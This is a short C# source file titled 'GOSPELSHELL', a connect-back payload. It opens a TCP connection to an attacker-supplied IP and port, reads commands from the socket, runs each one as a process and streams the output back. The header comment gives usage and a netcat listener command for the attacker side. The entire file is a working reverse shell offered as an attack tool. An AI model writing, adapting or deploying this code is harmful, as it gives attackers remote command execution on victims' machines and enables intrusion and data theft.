//Author: x3assexe
//Date: 31032020
//Summmary::Connect Back Payload
/*******************************
*ex. _G0spelShell.exe <ip> <port>
*Simple connect back payload
*Required arguments are  attacker ip> and attacker <port>
*Receiving connection should be listenining on given port
* ex. attacker: nc -nvlp <port>
*/

using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Linq;

namespace GOSPELSHELL
{
    public class GOSPELSHELLCLASS
    {
        public static void Main (string[] args)
        {
            using (TcpClient client  = new TcpClient (args [0], int.Parse (args [1]))) {
                using  (Stream stream =client.GetStream ()) {
                    using (StreamReader rdr = new StreamReader (stream)) {
                        while (true){
                            string _shell = rdr.ReadLine();

                            if (string.IsNullOrEmpty (_shell)){
                                rdr.Close();
                                stream.Close();
                                client.Close();
                                return;
                            }

                            if (string.IsNullOrWhiteSpace(_shell))
                                continue;
                            //4.3Reads command from screen and parses command.
                            string[] split = _shell.Trim().Split(' ');
                            string filename = split.First();
                            string arg = string.Join(" ", split.Skip(1));

                            try {
                                Process prc = new Process();
                                prc.StartInfo = new ProcessStartInfo();
                                prc.StartInfo.FileName = filename;
                                prc.StartInfo.Arguments = arg;
                                prc.StartInfo.UseShellExecute = false;
                                prc.StartInfo.RedirectStandardOutput = true;
                                prc.Start();
                                prc.StandardOutput.BaseStream.CopyTo(stream);
                                prc.WaitForExit();
                            } catch {
                                string UBAD = "Hm..Something Isn't right here... " + _shell + "\n";
                                byte[] errorBytes = Encoding.ASCII.GetBytes(UBAD);
                                stream.Write(errorBytes, 0, errorBytes.Length);
                            }
                        }
                    }
                }
            }
        }
    }
}
